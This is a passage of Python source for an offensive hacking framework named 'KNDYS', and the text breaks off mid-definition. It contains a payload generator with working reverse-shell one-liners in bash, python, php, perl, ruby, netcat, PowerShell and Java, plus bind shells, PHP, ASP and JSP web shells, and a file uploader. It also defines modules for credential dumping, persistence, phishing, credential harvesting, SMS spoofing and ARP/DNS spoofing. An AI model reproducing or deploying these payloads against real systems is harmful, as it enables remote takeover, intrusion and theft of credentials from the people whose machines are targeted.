#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import random
import threading
import socket
import subprocess
import json
import hashlib
import base64
import re
import ssl
import zipfile
import tarfile
import gzip
import csv
import shutil
import xml.etree.ElementTree as ET
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, unquote
import concurrent.futures
import ipaddress
import itertools
import string
import struct
import platform
import argparse
import readline
import getpass
import mimetypes
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Any
from functools import wraps
from collections import deque
import queue
import logging

# External libraries (install with: pip install -r requirements.txt)
try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[-] Requests library not found. Install with: pip install requests")
    sys.exit(1)

try:
    from colorama import Fore, Style, Back, init
    init(autoreset=True)
    COLORS = True
except ImportError:
    # Fallback to basic colors
    class Fore:
        RED = YELLOW = GREEN = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
    COLORS = False

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import nmap
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    import sqlite3
    DB_AVAILABLE = True
except ImportError:
    DB_AVAILABLE = False

# Banner
BANNER = f"""
{Fore.CYAN}{Style.BRIGHT}
╔══════════════════════════════════════════════════╗
║                                                  ║
║    ██╗  ██╗███╗   ██╗██████╗ ██╗   ██╗███████╗   ║
║    ██║ ██╔╝████╗  ██║██╔══██╗╚██╗ ██╔╝██╔════╝   ║
║    █████╔╝ ██╔██╗ ██║██║  ██║ ╚████╔╝ ███████╗   ║ 
║    ██╔═██╗ ██║╚██╗██║██║  ██║  ╚██╔╝  ╚════██║   ║
║    ██║  ██╗██║ ╚████║██████╔╝   ██║   ███████║   ║
║    ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   ╚══════╝   ║
║                                                  ║
║{Fore.WHITE}"u must take your pills"{Fore.CYAN}   ║
║ {Fore.YELLOW}v3.0{Fore.CYAN}                     ║
║                                                  ║
╚══════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

# ============ SECURITY AND UTILITY CLASSES ============

class InputValidator:
    """Input validation and sanitization"""
    
    @staticmethod
    def validate_ip(ip_str):
        """Validate IP address"""
        try:
            ipaddress.ip_address(ip_str)
            return True
        except ValueError:
            return False
    
    @staticmethod
    def validate_port(port):
        """Validate port number"""
        try:
            port_num = int(port)
            return 1 <= port_num <= 65535
        except (ValueError, TypeError):
            return False
    
    @staticmethod
    def validate_url(url):
        """Validate URL format"""
        try:
            result = urlparse(url)
            return all([result.scheme in ['http', 'https'], result.netloc])
        except:
            return False
    
    @staticmethod
    def sanitize_command(cmd):
        """Sanitize command for safe execution"""
        # Remove dangerous characters
        dangerous = [';', '|', '&', '`', '$', '(', ')', '<', '>', '\n', '\r']
        sanitized = cmd
        for char in dangerous:
            if char in sanitized:
                return None  # Reject dangerous commands
        return sanitized
    
    @staticmethod
    def sanitize_path(path):
        """Sanitize file path"""
        # Prevent directory traversal
        if '..' in path or path.startswith('/'):
            return None
        return os.path.normpath(path)
    
    @staticmethod
    def validate_email(email):
        """Validate email address"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

class RateLimiter:
    """Rate limiting for requests"""
    
    def __init__(self, max_requests=10, time_window=60):
        self.max_requests = max_requests
        self.time_window = time_window
        self.requests = deque()
        self.lock = threading.Lock()
    
    def allow_request(self):
        """Check if request is allowed"""
        with self.lock:
            now = time.time()
            
            # Remove old requests outside time window
            while self.requests and self.requests[0] < now - self.time_window:
                self.requests.popleft()
            
            # Check if we've exceeded limit
            if len(self.requests) >= self.max_requests:
                return False
            
            # Add new request
            self.requests.append(now)
            return True
    
    def wait_if_needed(self):
        """Wait if rate limit exceeded"""
        while not self.allow_request():
            time.sleep(0.1)

class SessionManager:
    """Manage active sessions with timeouts"""
    
    def __init__(self):
        self.sessions = {}
        self.session_timeout = 3600  # 1 hour
        self.lock = threading.Lock()
    
    def create_session(self, session_id, data=None):
        """Create new session"""
        with self.lock:
            self.sessions[session_id] = {
                'data': data or {},
                'created': time.time(),
                'last_activity': time.time()
            }
        return session_id
    
    def get_session(self, session_id):
        """Get session data"""
        with self.lock:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                
                # Check if session expired
                if time.time() - session['last_activity'] > self.session_timeout:
                    del self.sessions[session_id]
                    return None
                
                # Update last activity
                session['last_activity'] = time.time()
                return session['data']
            return None
    
    def update_session(self, session_id, data):
        """Update session data"""
        with self.lock:
            if session_id in self.sessions:
                self.sessions[session_id]['data'].update(data)
                self.sessions[session_id]['last_activity'] = time.time()
    
    def close_session(self, session_id):
        """Close and cleanup session"""
        with self.lock:
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def cleanup_expired(self):
        """Cleanup expired sessions"""
        with self.lock:
            now = time.time()
            expired = [
                sid for sid, session in self.sessions.items()
                if now - session['last_activity'] > self.session_timeout
            ]
            for sid in expired:
                del self.sessions[sid]

class ConnectionPool:
    """Connection pooling and management"""
    
    def __init__(self, max_connections=50):
        self.max_connections = max_connections
        self.active_connections = 0
        self.semaphore = threading.Semaphore(max_connections)
        self.lock = threading.Lock()
    
    def acquire(self):
        """Acquire connection from pool"""
        self.semaphore.acquire()
        with self.lock:
            self.active_connections += 1
    
    def release(self):
        """Release connection back to pool"""
        self.semaphore.release()
        with self.lock:
            self.active_connections -= 1
    
    def get_active_count(self):
        """Get number of active connections"""
        with self.lock:
            return self.active_connections

class ErrorHandler:
    """Centralized error handling"""
    
    def __init__(self, logger):
        self.logger = logger
        self.error_counts = {}
        self.lock = threading.Lock()
    
    def handle_error(self, error, context="", fatal=False):
        """Handle error with logging and tracking"""
        error_type = type(error).__name__
        error_msg = str(error)
        
        # Track error frequency
        with self.lock:
            self.error_counts[error_type] = self.error_counts.get(error_type, 0) + 1
        
        # Log error
        log_msg = f"{context}: {error_type} - {error_msg}"
        self.logger.log(log_msg, "ERROR")
        
        # Display to user
        print(f"{Fore.RED}[!] Error: {error_msg}{Style.RESET_ALL}")
        if context:
            print(f"{Fore.YELLOW}[*] Context: {context}{Style.RESET_ALL}")
        
        # If fatal, provide recovery suggestions
        if fatal:
            print(f"{Fore.RED}[!] Fatal error - operation aborted{Style.RESET_ALL}")
            self.suggest_recovery(error_type)
    
    def suggest_recovery(self, error_type):
        """Suggest recovery actions"""
        suggestions = {
            'ConnectionError': 'Check network connectivity and target availability',
            'TimeoutError': 'Increase timeout value or check target responsiveness',
            'PermissionError': 'Check file permissions or run with appropriate privileges',
            'ValueError': 'Verify input parameters and format',
            'KeyError': 'Check configuration options are properly set'
        }
        
        if error_type in suggestions:
            print(f"{Fore.CYAN}[→] Suggestion: {suggestions[error_type]}{Style.RESET_ALL}")
    
    def get_error_stats(self):
        """Get error statistics"""
        with self.lock:
            return dict(self.error_counts)

def retry_on_failure(max_retries=3, delay=1, backoff=2):
    """Decorator for retrying failed operations"""
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            retries = 0
            current_delay = delay
            
            while retries < max_retries:
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    retries += 1
                    if retries >= max_retries:
                        raise
                    
                    print(f"{Fore.YELLOW}[*] Retry {retries}/{max_retries} after {current_delay}s...{Style.RESET_ALL}")
                    time.sleep(current_delay)
                    current_delay *= backoff
            
        return wrapper
    return decorator

class Logger:
    """Enhanced logging system with rotation and encryption"""
    def __init__(self):
        self.log_file = f"kndys_session_{int(time.time())}.log"
        self.session_file = f"kndys_session_{int(time.time())}.json"
        self.max_log_size = 10 * 1024 * 1024  # 10MB
        self.lock = threading.Lock()
        
        # Setup Python logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.FileHandler(self.log_file),
                logging.StreamHandler(sys.stdout)
            ]
        )
        self.python_logger = logging.getLogger('KNDYS')
        
    def log(self, message, level="INFO"):
        """Log message to file with rotation"""
        with self.lock:
            try:
                # Check log file size and rotate if needed
                if os.path.exists(self.log_file):
                    if os.path.getsize(self.log_file) > self.max_log_size:
                        self.rotate_log()
                
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[{timestamp}] [{level}] {message}"
                
                with open(self.log_file, 'a', encoding='utf-8') as f:
                    f.write(log_entry + "\n")
                
                # Also use Python logging
                log_level = getattr(logging, level, logging.INFO)
                self.python_logger.log(log_level, message)
                    
                # Save to session file
                self.save_session(message)
            except Exception as e:
                print(f"{Fore.RED}[!] Logging error: {str(e)}{Style.RESET_ALL}")
    
    def rotate_log(self):
        """Rotate log file when it gets too large"""
        try:
            timestamp = int(time.time())
            backup_file = f"{self.log_file}.{timestamp}"
            shutil.move(self.log_file, backup_file)
            print(f"{Fore.YELLOW}[*] Log rotated to {backup_file}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[!] Log rotation failed: {str(e)}{Style.RESET_ALL}")
        
    def save_session(self, data):
        """Save data to session file with error handling"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {
                    "actions": [], 
                    "findings": [], 
                    "credentials": [],
                    "errors": [],
                    "start_time": datetime.now().isoformat()
                }
                
            session_data["actions"].append({
                "timestamp": datetime.now().isoformat(),
                "data": str(data)[:1000]  # Limit data size
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except Exception as e:
            # Silent fail for session save to not interrupt operations
            pass
    
    def save_finding(self, finding_type, data):
        """Save security finding"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {"actions": [], "findings": [], "credentials": []}
            
            session_data["findings"].append({
                "timestamp": datetime.now().isoformat(),
                "type": finding_type,
                "data": data
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except:
            pass
    
    def save_credential(self, username, password, source):
        """Save captured credential"""
        try:
            if os.path.exists(self.session_file):
                with open(self.session_file, 'r', encoding='utf-8') as f:
                    session_data = json.load(f)
            else:
                session_data = {"actions": [], "findings": [], "credentials": []}
            
            session_data["credentials"].append({
                "timestamp": datetime.now().isoformat(),
                "username": username,
                "password": hashlib.sha256(password.encode()).hexdigest(),  # Hash for security
                "source": source
            })
            
            with open(self.session_file, 'w', encoding='utf-8') as f:
                json.dump(session_data, f, indent=2)
        except:
            pass

class ExploitDB:
    """Local exploit database"""
    def __init__(self):
        self.exploits = self.load_exploits()
        
    def load_exploits(self):
        """Load exploit database"""
        exploits = {
            # Web exploits
            "web": [
                {
                    "id": "EX-001",
                    "name": "SQL Injection Classic",
                    "description": "Classic SQL injection attack",
                    "type": "web",
                    "port": 80,
                    "payload": "' OR '1'='1' --"
                },
                {
                    "id": "EX-002",
                    "name": "XSS Reflected",
                    "description": "Reflected Cross-Site Scripting",
                    "type": "web",
                    "port": 80,
                    "payload": "<script>alert('XSS')</script>"
                },
                {
                    "id": "EX-003",
                    "name": "Command Injection",
                    "description": "OS Command Injection",
                    "type": "web",
                    "port": 80,
                    "payload": "; ls -la"
                }
            ],
            # Network exploits
            "network": [
                {
                    "id": "EX-101",
                    "name": "SMB EternalBlue",
                    "description": "MS17-010 SMB Vulnerability",
                    "type": "network",
                    "port": 445,
                    "payload": "eternalblue"
                },
                {
                    "id": "EX-102",
                    "name": "Heartbleed",
                    "description": "OpenSSL Heartbleed Vulnerability",
                    "type": "network",
                    "port": 443,
                    "payload": "heartbleed"
                }
            ],
            # Service-specific exploits
            "services": [
                {
                    "id": "EX-201",
                    "name": "FTP Anonymous Login",
                    "description": "FTP server with anonymous login enabled",
                    "type": "service",
                    "port": 21,
                    "payload": "anonymous"
                },
                {
                    "id": "EX-202",
                    "name": "SSH Brute Force",
                    "description": "SSH password brute force attack",
                    "type": "service",
                    "port": 22,
                    "payload": "ssh_brute"
                }
            ]
        }
        return exploits
        
    def search_exploits(self, query):
        """Search for exploits"""
        results = []
        for category, exploit_list in self.exploits.items():
            for exploit in exploit_list:
                if query.lower() in exploit["name"].lower() or query.lower() in exploit["description"].lower():
                    results.append(exploit)
        return results

class PayloadGenerator:
    """Payload generation system"""
    def __init__(self):
        self.payloads = {}
        self.load_payloads()
        
    def load_payloads(self):
        """Load all payload templates"""
        self.payloads = {
            # Reverse Shells
            "reverse_shell": {
                "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "nc": "nc -e /bin/sh {LHOST} {LPORT}",
                "nc_traditional": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
                "powershell": """powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
                "java": """java -e 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}} catch (Exception e){{}} }};p.destroy();s.close();'"""
            },
            
            # Bind Shells
            "bind_shell": {
                "bash": "bash -i >& /dev/tcp/{LPORT}/0.0.0.0 0>&1",
                "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'""",
                "nc": "nc -lvp {LPORT} -e /bin/sh"
            },
            
            # Web Shells
            "web_shell": {
                "php": """<?php system($_GET['cmd']); ?>""",
                "php_advanced": """<?php if(isset($_REQUEST['cmd'])){{echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}} ?>""",
                "asp": """<%@ Language=VBScript %><% If Request("cmd") <> "" Then ExecuteGlobal(Request("cmd")) %>""",
                "jsp": """<%@ page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %>"""
            },
            
            # Meterpreter Payloads
            "meterpreter": {
                "windows_x64": "windows/x64/meterpreter/reverse_tcp",
                "windows_x86": "windows/meterpreter/reverse_tcp",
                "linux_x64": "linux/x64/meterpreter/reverse_tcp",
                "android": "android/meterpreter/reverse_tcp"
            },
            
            # File Upload
            "file_upload": {
                "php_uploader": """<?php $uploaddir = '/tmp/'; $uploadfile = $uploaddir . basename($_FILES['file']['name']); if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) { echo "File uploaded successfully."; } else { echo "File upload failed."; } ?>"""
            }
        }
        
    def generate(self, payload_type, platform="bash", **kwargs):
        """Generate payload with substitutions"""
        if payload_type in self.payloads and platform in self.payloads[payload_type]:
            payload = self.payloads[payload_type][platform]
            for key, value in kwargs.items():
                payload = payload.replace(f"{{{key}}}", str(value))
            return payload
        return None

class KNDYSFramework:
    """Main KNDYS Framework class with enhanced security"""
    def __init__(self):
        self.current_module = None
        self.module_options = {}
        self.targets = []
        self.running = False
        self.session_id = self.generate_session_id()
        self.logger = Logger()
        self.exploit_db = ExploitDB()
        self.payload_gen = PayloadGenerator()
        self.wordlists = {}
        self.credentials = {}
        
        # Security components
        self.validator = InputValidator()
        self.rate_limiter = RateLimiter(max_requests=100, time_window=60)
        self.session_manager = SessionManager()
        self.connection_pool = ConnectionPool(max_connections=50)
        self.error_handler = ErrorHandler(self.logger)
        
        self.load_config()
        self.initialize_modules()
        self.initialize_wordlists()
        
        # Start background cleanup thread
        self.cleanup_thread = threading.Thread(target=self._background_cleanup, daemon=True)
        self.cleanup_thread.start()
        
    def generate_session_id(self):
        """Generate unique session ID"""
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:10]
    
    def load_config(self):
        """Load configuration"""
        self.config = {
            "lhost": self.get_local_ip(),
            "lport": 4444,
            "rhost": "",
            "rport": "",
            "threads": 50,
            "timeout": 5,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "proxy": None,
            "verbose": True
        }
    
    def _background_cleanup(self):
        """Background thread for cleanup tasks"""
        while True:
            try:
                time.sleep(300)  # Every 5 minutes
                self.session_manager.cleanup_expired()
                self.logger.log("Background cleanup completed", "DEBUG")
            except Exception as e:
                self.error_handler.handle_error(e, "Background cleanup")
    
    def get_local_ip(self):
        """Get local IP address with fallback"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception as e:
            self.logger.log(f"Could not determine local IP: {str(e)}", "WARNING")
            return "127.0.0.1"
    
    def display_banner(self):
        """Display KNDYS banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        
        # Show minimal startup hint
        print(f"{Fore.WHITE}┌─[{Fore.CYAN}Quick Start{Fore.WHITE}]")
        print(f"│ {Fore.GREEN}help{Fore.WHITE}             → Show all commands")
        print(f"│ {Fore.GREEN}show modules{Fore.WHITE}     → List available modules")
        print(f"│ {Fore.GREEN}show wordlists{Fore.WHITE}   → View password dictionaries")
        print(f"└─────────────────────────────────────{Style.RESET_ALL}\n")
        
        # Show warnings for missing dependencies
        missing = []
        if not NMAP_AVAILABLE:
            missing.append("python-nmap")
        if not SCAPY_AVAILABLE:
            missing.append("scapy")
        if not SSH_AVAILABLE:
            missing.append("paramiko")
        if not BS4_AVAILABLE:
            missing.append("beautifulsoup4")
        
        if missing:
            print(f"{Fore.YELLOW}⚠  Optional dependencies missing: {Fore.WHITE}{', '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Install: {Fore.CYAN}pip install {' '.join(missing)}{Style.RESET_ALL}\n")
    
    def initialize_modules(self):
        """Initialize all available modules"""
        self.modules = {
            # Reconnaissance Modules
            'recon': {
                'port_scanner': {
                    'description': 'Professional port scanner: Service detection, banner grabbing, vulnerability checks, 90+ services database',
                    'options': {
                        'target': '192.168.1.1',
                        'ports': '1-1000',
                        'threads': '50',
                        'timeout': '2',
                        'scan_type': 'tcp_connect',
                        'aggressive': 'false'
                    }
                },
                'subdomain_scanner': {
                    'description': 'Professional subdomain enumeration: DNS brute-force, Zone Transfer, Certificate Transparency, wildcard detection, HTTP verification',
                    'options': {
                        'domain': 'example.com',
                        'wordlist': '',
                        'threads': '20',
                        'techniques': 'all',
                        'verify_http': 'true',
                        'output': 'subdomains.txt'
                    }
                },
                'web_crawler': {
                    'description': 'Advanced website crawler with vulnerability detection',
                    'options': {
                        'url': 'http://example.com',
                        'depth': '3',
                        'threads': '10',
                        'extensions': 'php,html,asp,aspx,jsp'
                    }
                },
                'network_mapper': {
                    'description': 'Network discovery and mapping',
                    'options': {
                        'network': '192.168.1.0/24',
                        'ping': 'true',
                        'ports': '22,80,443,445'
                    }
                },
                'os_detection': {
                    'description': 'Remote OS detection using TCP/IP fingerprinting',
                    'options': {
                        'target': '192.168.1.1',
                        'ports': '22,80,443'
                    }
                }
            },
            
            # Vulnerability Scanning Modules
            'scan': {
                'vuln_scanner': {
                    'description': 'Comprehensive vulnerability scanner with 33 checks',
                    'options': {
                        'target': 'http://example.com',
                        'scan_type': 'full',  # quick, web, api, full
                        'threads': '5',
                        'depth': '2',
                        'aggressive': 'false',
                        'stealth_mode': 'false'
                    }
                },
                'sql_scanner': {
                    'description': 'Advanced SQL injection scanner with exploitation',
                    'options': {
                        'url': 'http://example.com/page.php?id=1',
                        'technique': 'time_based,error_based,boolean',
                        'threads': '5'
                    }
                },
                'xss_scanner': {
                    'description': 'Cross-Site Scripting vulnerability scanner',
                    'options': {
                        'url': 'http://example.com',
                        'method': 'GET',
                        'parameters': 'all'
                    }
                },
                'csrf_scanner': {
                    'description': 'CSRF vulnerability detection',
                    'options': {
                        'url': 'http://example.com',
                        'forms': 'all'
                    }
                },
                'ssl_scanner': {
                    'description': 'SSL/TLS vulnerability scanner',
                    'options': {
                        'target': 'example.com:443',
                        'checks': 'all'
                    }
                },
                'dir_traversal': {
                    'description': 'Directory traversal vulnerability scanner',
                    'options': {
                        'url': 'http://example.com',
                        'depth': '3'
                    }
                }
            },
            
            # Exploitation Modules
            'exploit': {
                'multi_handler': {
                    'description': 'Multi/handler for receiving reverse connections',
                    'options': {
                        'lhost': self.config['lhost'],
                        'lport': '4444',
                        'payload': 'generic/shell_reverse_tcp'
                    }
                },
                'sql_injection': {
                    'description': 'SQL injection exploitation tool',
                    'options': {
                        'url': 'http://example.com/vuln.php?id=1',
                        'technique': 'union',
                        'dbms': 'mysql',
                        'dump': 'true'
                    }
                },
                'xss_exploit': {
                    'description': 'XSS exploitation with cookie stealing',
                    'options': {
                        'url': 'http://example.com/search.php?q=',
                        'payload': 'xss_cookie_stealer',
                        'server': 'localhost:8080'
                    }
                },
                'command_injection': {
                    'description': 'Command injection exploitation',
                    'options': {
                        'url': 'http://example.com/cmd.php',
                        'parameter': 'cmd',
                        'os': 'linux'
                    }
                },
                'file_upload': {
                    'description': 'File upload vulnerability exploitation',
                    'options': {
                        'url': 'http://example.com/upload.php',
                        'parameter': 'file',
                        'shell': 'php'
                    }
                },
                'buffer_overflow': {
                    'description': 'Buffer overflow exploitation framework',
                    'options': {
                        'target': '192.168.1.100:9999',
                        'fuzzer': 'true',
                        'pattern_create': '1000'
                    }
                }
            },
            
            # Post-Exploitation Modules
            'post': {
                'shell': {
                    'description': 'Interactive system shell',
                    'options': {
                        'session': '1',
                        'command': 'whoami'
                    }
                },
                'file_explorer': {
                    'description': 'Remote file system explorer',
                    'options': {
                        'session': '1',
                        'path': '/'
                    }
                },
                'privilege_escalation': {
                    'description': 'Automated privilege escalation checks',
                    'options': {
                        'session': '1',
                        'check': 'all'
                    }
                },
                'credential_dumper': {
                    'description': 'Extract credentials from compromised system',
                    'options': {
                        'session': '1',
                        'os': 'windows'
                    }
                },
                'persistence': {
                    'description': 'Establish persistence on compromised system',
                    'options': {
                        'session': '1',
                        'method': 'service'
                    }
                },
                'pivot': {
                    'description': 'Network pivoting and lateral movement',
                    'options': {
                        'session': '1',
                        'target': '192.168.2.0/24'
                    }
                }
            },
            
            # Password Attacks
            'password': {
                'brute_force': {
                    'description': 'Password brute force attacks',
                    'options': {
                        'target': 'ssh://192.168.1.1:22',
                        'username': 'admin',
                        'wordlist': 'passwords.txt',
                        'service': 'ssh'
                    }
                },
                'hash_cracker': {
                    'description': 'Hash cracking with multiple algorithms',
                    'options': {
                        'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
                        'type': 'md5',
                        'wordlist': 'rockyou.txt'
                    }
                },
                'spray_attack': {
                    'description': 'Password spray attack',
                    'options': {
                        'target': 'owa.example.com',
                        'usernames': 'users.txt',
                        'passwords': 'passwords.txt',
                        'delay': '10'
                    }
                },
                'credential_stuffing': {
                    'description': 'Credential stuffing attack',
                    'options': {
                        'target': 'http://example.com/login',
                        'credentials': 'creds.txt',
                        'threads': '5'
                    }
                }
            },
            
            # Wireless Modules
            'wireless': {
                'wifi_scanner': {
                    'description': 'WiFi network scanner',
                    'options': {
                        'interface': 'wlan0',
                        'channel': 'all'
                    }
                },
                'wifi_cracker': {
                    'description': 'WPA/WPA2 handshake cracker',
                    'options': {
                        'handshake': 'capture.pcap',
                        'wordlist': 'rockyou.txt',
                        'bssid': '00:11:22:33:44:55'
                    }
                },
                'rogue_ap': {
                    'description': 'Rogue access point creator',
                    'options': {
                        'interface': 'wlan0',
                        'ssid': 'Free_WiFi',
                        'channel': '6'
                    }
                }
            },
            
            # Social Engineering
            'social': {
                'phishing': {
                    'description': 'Advanced phishing campaign with templates',
                    'options': {
                        'template': 'office365',
                        'targets': 'emails.txt',
                        'server': 'smtp.gmail.com',
                        'from_name': 'IT Support',
                        'subject': 'Password Reset Required'
                    }
                },
                'credential_harvester': {
                    'description': 'Web credential harvester with multiple templates',
                    'options': {
                        'port': '80',
                        'template': 'facebook',
                        'redirect': 'https://facebook.com',
                        'log_file': 'harvested_creds.txt'
                    }
                },
                'website_cloner': {
                    'description': 'Advanced website cloner with injection',
                    'options': {
                        'url': 'https://facebook.com',
                        'output': 'phish_site',
                        'inject_keylogger': 'false'
                    }
                },
                'mass_mailer': {
                    'description': 'Mass email campaign system',
                    'options': {
                        'template': 'invoice',
                        'targets': 'targets.csv',
                        'attachment': '',
                        'smtp_server': 'smtp.gmail.com',
                        'delay': '5'
                    }
                },
                'qr_generator': {
                    'description': 'Malicious QR code generator',
                    'options': {
                        'url': 'http://malicious-site.com',
                        'output': 'qr_code.png',
                        'size': '300'
                    }
                },
                'usb_payload': {
                    'description': 'USB payload generator (BadUSB/Rubber Ducky)',
                    'options': {
                        'payload_type': 'reverse_shell',
                        'target_os': 'windows',
                        'lhost': self.config['lhost'],
                        'lport': '4444',
                        'output': 'payload.txt'
                    }
                },
                'fake_update': {
                    'description': 'Fake software update page generator',
                    'options': {
                        'software': 'chrome',
                        'payload': 'update.exe',
                        'port': '8080'
                    }
                },
                'sms_spoofing': {
                    'description': 'SMS spoofing campaign with Twilio integration',
                    'options': {
                        'message': 'Your package is ready. Track: {link}',
                        'sender': 'DHL',
                        'targets': 'phones.txt',
                        'twilio_sid': '',
                        'twilio_token': '',
                        'twilio_number': '',
                        'link': 'http://track.example.com/123',
                        'delay': '2'
                    }
                },
                'pretexting': {
                    'description': 'Pretexting scenario generator',
                    'options': {
                        'scenario': 'it_support',
                        'company': 'TechCorp',
                        'urgency': 'high'
                    }
                }
            },
            
            # Network Attacks
            'network': {
                'arp_spoof': {
                    'description': 'ARP spoofing / Man-in-the-Middle attack',
                    'options': {
                        'target_ip': '192.168.1.100',
                        'gateway_ip': '192.168.1.1',
                        'interface': 'eth0'
                    }
                },
                'dns_spoof': {
                    'description': 'DNS spoofing attack',
                    'options': {
                        'domain': 'google.com',
                        'fake_ip': '192.168.1.100',
                        'interface': 'eth0'
                    }
                },
                'dhcp_starvation': {
                    'description': 'DHCP starvation attack',
                    'options': {
                        'interface': 'eth0',
                        'count': '100'
                    }
                },
                'ssl_strip': {
                    'description': 'SSL stripping attack',
                    'options': {
                        'interface': 'eth0',
                        'port': '8080'
                    }
                },
                'packet_sniffer': {
                    'description': 'Advanced packet sniffer with filters',
                    'options': {
                        'interface': 'eth0',
                        'filter': 'tcp port 80',
                        'output': 'capture.pcap',
                        'count': '100'
                    }
                }
            },
            
            # Web Application Testing
            'webapp': {
                'jwt_cracker': {
                    'description': 'JSON Web Token security tester',
                    'options': {
                        'token': '',
                        'wordlist': 'secrets.txt',
                        'algorithm': 'HS256'
                    }
                },
                'api_fuzzer': {
                    'description': 'REST API fuzzer and tester',
                    'options': {
                        'url': 'https://api.example.com',
                        'method': 'POST',
                        'endpoints': 'endpoints.txt'
                    }
                },
                'cors_scanner': {
                    'description': 'CORS misconfiguration scanner',
                    'options': {
